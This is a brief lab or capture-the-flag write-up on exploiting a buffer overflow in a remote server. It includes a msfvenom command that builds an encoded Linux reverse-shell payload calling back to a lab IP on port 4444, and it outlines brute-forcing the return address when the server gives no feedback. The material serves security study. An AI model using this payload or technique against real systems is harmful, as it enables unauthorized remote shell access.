# Remote Exploit
## 0x00 Task
The task here is to exploit a buffer overflow vulnerability on a remote server. The vulnerable application is running on port 8000 and we have to inject a suitable shellcode to hijack the control of its execution. What makes this exploit relatively challenging when compared to others, is that the server is remote and we cannot read the error messages from it once we send the packets to it. However, we have the piece of code which has the vulnerability server.c
## 0x01 Payload creation
With msfvenom, we create a non staged payload which provides us with reverse shell on port 4444 on our lab machine. To eliminate the bad characters we use the x86/alpha_upper encoder.
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.3 LPORT=4444 AppendExit=true -e x86/alpha_upper -f py
```
## 0x02 Testing the exploit locally
Since, we do not have the access to the vulnerable server, we need to first try and test the exploit locally on the server code we have access to. Luckily, the compiler versions on both the lab machine and the remote server are the same. The debugger can help us exploiting it locally. We start a listener using netcat on port 4444 and test our exploit *rexploit.py*. We can successfully exploit locally, we proceed to exploit it remotely. On the localhost the memory address is between 0xffff0000 to 0xffffffff

## 0x03 Send the Exploit to Remote Server
The main problem is, there is no way for us to find out the correct return address as there is no feedback from the server. We overcome this, by writing a script which will try to brute force all the memory addresses to find our return address. For remote, the address is not found in 0xffff0000 to 0xffffffff .So, enumeration is run from 0xff000000 to 0xffffffff. Sleep(0.1) is added as a precautionary measure. Our exploit is successful when we manage to get a shell in the listener!
